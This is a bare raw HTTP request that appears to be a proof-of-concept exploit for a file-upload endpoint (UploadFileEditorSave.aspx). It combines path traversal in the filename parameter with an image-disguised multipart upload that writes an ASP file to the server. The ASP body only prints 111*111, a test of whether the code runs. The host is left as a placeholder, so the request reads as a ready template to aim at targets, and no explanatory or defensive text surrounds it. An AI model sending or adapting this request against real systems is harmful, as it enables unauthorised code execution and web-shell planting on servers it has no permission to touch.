```
POST /C6/Control/UploadFileEditorSave.aspx?filename=\....\....\C6\qps4cckjuz.asp HTTP/1.1
Host: your_ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Connection: close
Content-Length: 191
Content-Type: multipart/form-data; boundary=----9fh1lo9qobtszaiahg6v
Accept-Encoding: gzip, deflate

------9fh1lo9qobtszaiahg6v
Content-Disposition: form-data; name="file"; filename="qps4cckjuz.jpg"
Content-Type: image/png

<% response.write(111*111)
%>

------9fh1lo9qobtszaiahg6v--
```

